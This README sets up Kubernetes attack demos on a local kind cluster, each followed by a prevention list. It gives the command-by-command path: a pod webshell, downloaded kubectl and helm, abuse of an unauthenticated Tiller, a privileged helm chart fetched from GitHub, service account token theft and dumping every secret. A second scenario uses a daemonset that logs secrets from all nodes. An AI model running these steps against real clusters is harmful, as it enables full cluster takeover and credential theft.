# Kubernetes Security Demos

## Install Kind

See: [installing Kind](https://kind.sigs.k8s.io/docs/user/quick-start/)

```console
kind version
```

should return with this version or later:
```console
kind v0.6.1 go1.13.4 darwin/amd64
```

## Create Kind Demo Cluster

Use kind to create the customized cluster:

```console
kind create cluster --config=kind/cluster.yaml --name=demo --image=docker.io/kindest/node:v1.16.3@sha256:70ce6ce09bee5c34ab14aec2b84d6edb260473a60638b1b095470a3a0f95ebec
```

Install Calico for `NetworkPolicy` support:

```console
kubectl apply -f kind/calico.yaml
```

Verifying the cluster is ready:

```console
kubectl get pods -A
```

Should show:

```console
NAMESPACE     NAME                                         READY   STATUS    RESTARTS   AGE
kube-system   calico-kube-controllers-778676476b-c2g4p     1/1     Running   0          54s
kube-system   calico-node-db4hq                            1/1     Running   0          54s
kube-system   calico-node-r6wfn                            1/1     Running   0          54s
kube-system   coredns-5644d7b6d9-579wk                     1/1     Running   0          31m
kube-system   coredns-5644d7b6d9-8mw2j                     1/1     Running   0          31m
kube-system   etcd-demo-control-plane                      1/1     Running   0          30m
kube-system   kube-apiserver-demo-control-plane            1/1     Running   0          30m
kube-system   kube-controller-manager-demo-control-plane   1/1     Running   0          30m
kube-system   kube-proxy-fwg7z                             1/1     Running   0          31m
kube-system   kube-proxy-knpph                             1/1     Running   0          31m
kube-system   kube-scheduler-demo-control-plane            1/1     Running   0          30m
```

## Demo 1: Compromise of a Public-Facing Pod

### Description

This scenario demonstrates the potential for privilege escalation and lateral movement as a result of a pod compromise in a Kubernetes cluster with commonly-found configurations leading to full cluster access.

### Steps

#### Preparation

```console
kubectl apply -f demo1/installation.yaml
```

#### Exploitation

1. Create a local proxy to reach the "exposed" `dashboard` service:

```console
kubectl port-forward service/dashboard 8080:8080
```

2. Visit the `dashboard` by opening [http://localhost:8080](http://localhost:8080).
3. Navigate to [/webshell](http://localhost:8080/webshell) and provide the basic auth credentials.  Explain that arriving at this point is multi-faceted (backdoored software library, application vulnerability resulting in remote-code execution, etc).
4. Now at a shell inside the `dashboard` pod, perform a few commands like `id` and `hostname` and `env` to know we're in a Kubernetes cluster.
5. Download and run `kubectl`:

```console
export PATH=/tmp:$PATH
cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl; chmod +x kubectl
```

6. Enumerate the `tiller` deployment running in `kube-system`

```console
curl -v tiller-deploy.kube-system:44134
```
7. Download the `helm` client binary and run `helm ls`.

```console
cd /tmp; curl -so helm.tar.gz https://get.helm.sh/helm-v2.16.1-linux-amd64.tar.gz; tar zxvf helm.tar.gz; chmod +x linux-amd64/helm; cp linux-amd64/helm .
```

```console
helm version --host=tiller-deploy.kube-system:44134
```

```console
export HELM_HOST=tiller-deploy.kube-system:44134; helm ls
```

8. `helm install` a privileged/hostpath deployment via helm chart.

```console
curl -sLO https://github.com/bgeesaman/nginx-test/archive/v1.0.0.tar.gz
```

```console
helm install v1.0.0.tar.gz
```

9. Find/access the webshell with `curl` and run commands in the privileged pod as `cluster-admin` 

Get the newly created pod's service account token.  The helm chart bound it to `cluster-admin` during installation.

```console
curl -XPOST -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token" nginx-test.default:8080
```

Run `kubectl get secrets --all-namespaces` using the pod's mounted service account token as `cluster-admin`:

```console
curl -XPOST -d "cmd=kubectl get secrets -A" nginx-test.default:8080
```

Run `kubectl get secrets --all-namespaces -o yaml` using the pod's mounted service account token as `cluster-admin`:

```console
curl -XPOST -d "cmd=kubectl get secrets -A -o yaml" nginx-test.default:8080
```

### Prevention

* Container vulnerability scanning
* Admission control disallowing vulnerable container images
* Admission control disallowing container images from non-trusted container registries
* Admission control disallowing privileged/hostpath pods
* Network policy preventing egress from the web pod
* Network policy prevening ingress to the tiller pod
* TLS Auth on Tiller or upgrade Tiller to v3

## Demo 2: Compromise of a Developer's Limited Cluster Access

### Description

This scenario demonstrates the potential for privilege escalation and network policy bypass by a malicious insider or compromise of their credentials with the ability to create pods in a namespace leading to full cluster access.

### Steps

#### Preparation

```console
kubectl apply -f demo1/installation.yaml # To ensure Tiller is installed
kubectl apply -f demo2/installation.yaml # SA, RBAC, and network policy
```

### Exploitation (Method 1)

1. Show access to the `default` namespace but not to `kube-system` to create pods.
2. Run a `kubectl apply -f demo2/hostnetwork.yaml` to deploy a host network pod that bypasses network egress policy on the namespace.
3. Download the `helm` client binary and run `helm ls` to show that it can control Tiller.

### Exploitation (Method 2)

1. Show access to the `default` namespace but not to `kube-system` to create pods.

```console
kubectl auth can-i -n kube-system create pods
kubectl auth can-i -n default create pods
```


2. Deploy the host path daemonset that reads all mounted secrets contents from all nodes into stdout

```console
kubectl apply -f demo2/daemonset.yaml
```

3. Read the secrets in stdout.

```console
kubectl logs -f daemonset/secret-logger --all-containers=true --since=1m
```

4. Cleanup

```console
kubectl delete -f demo2/daemonset.yaml
```

### Prevention

* Container vulnerability scanning
* Admission control disallowing vulnerable container images
* Admission control disallowing container images from non-trusted container registries
* Admission control disallowing host network/privileged/hostpath pods
* Network policy prevening ingress to the tiller pod
* TLS Auth on Tiller or upgrade Tiller to v3
* Audit logging for all activities to find RBAC failures for uncommon commands.

## Cleanup

```console
kubectl delete -f demo1/pod.yaml
kubectl delete -f demo1/installation.yaml
kubectl delete -f demo2/hostnetwork.yaml
kubectl delete -f demo2/daemonset.yaml
kubectl delete -f demo2/installation.yaml
```

```console
kind delete cluster --name=demo
```
